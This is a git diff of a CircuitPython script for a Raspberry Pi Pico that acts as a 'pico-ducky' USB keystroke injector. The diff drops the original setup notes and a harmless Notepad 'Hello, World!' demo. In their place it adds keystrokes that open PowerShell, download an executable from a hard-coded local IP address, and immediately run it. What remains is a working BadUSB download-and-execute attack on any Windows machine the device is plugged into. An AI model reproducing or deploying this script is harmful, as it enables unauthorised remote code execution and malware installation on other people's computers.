@@ -1,6 +1,3 @@
-- follow instructions on the https://github.com/dbisu/pico-ducky
-- if u want to use normla code and not ducky script after all the instructions remove the 3 last files for the code and add this 
-``` python
 import time
 import usb_hid
 from adafruit_hid.keyboard import Keyboard
@@ -19,18 +16,13 @@ keyboard.release_all()
 
 time.sleep(0.5)  # Short delay to ensure the Run dialog opens
 
-# Type 'notepad' to open Notepad
-layout.write("notepad")
+# open powershell
+layout.write("powershell")
 keyboard.press(Keycode.ENTER)
 keyboard.release_all()
 
 time.sleep(1)  # Wait for Notepad to open
 
 # Now type the message in Notepad
-layout.write("Hello, World!")
-keyboard.press(Keycode.ENTER)
+layout.write("Invoke-WebRequest -Uri http://192.168.1.140:3232/4ac5d816227cbfba9580a510af5272e2 -OutFile test.exe; Start-Process .\\test.exe")
 keyboard.release_all()
-``` 
-
-
-- make sure the file is names code.py
